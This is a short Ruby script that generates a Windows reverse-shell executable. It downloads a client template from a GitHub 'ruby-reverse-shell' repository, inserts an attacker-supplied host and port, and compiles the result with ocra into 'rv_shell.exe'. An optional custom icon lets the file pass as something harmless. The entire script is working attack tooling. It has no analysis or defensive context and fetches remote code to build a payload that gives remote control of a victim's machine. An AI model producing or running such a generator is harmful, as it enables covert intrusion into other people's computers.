require "net/http"
require "socket"
host = ARGV[0]
port = ARGV[1]

script = Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/Matthiasclee/ruby-reverse-shell/main/client-generator-temp-client.rb")).gsub("<-HOST->", '"' + host + '"').gsub("<-PORT->", port)
File.write("./temp_scr.rb", script)
File.write("./TEMPFILE_CLIENT_CLIENTGEN_OCRA", "TEMP")
Thread.new do
	srv = TCPServer.new("0.0.0.0", 3455)
	cli = srv.accept
	cli.puts "exit"
end
system("ocra --add-all-core --windows --output rv_shell.exe#{
	if ARGV[2]
		" --icon #{ARGV[2]}"
	end
} temp_scr.rb")
File.delete("./temp_scr.rb")
File.delete("./TEMPFILE_CLIENT_CLIENTGEN_OCRA")
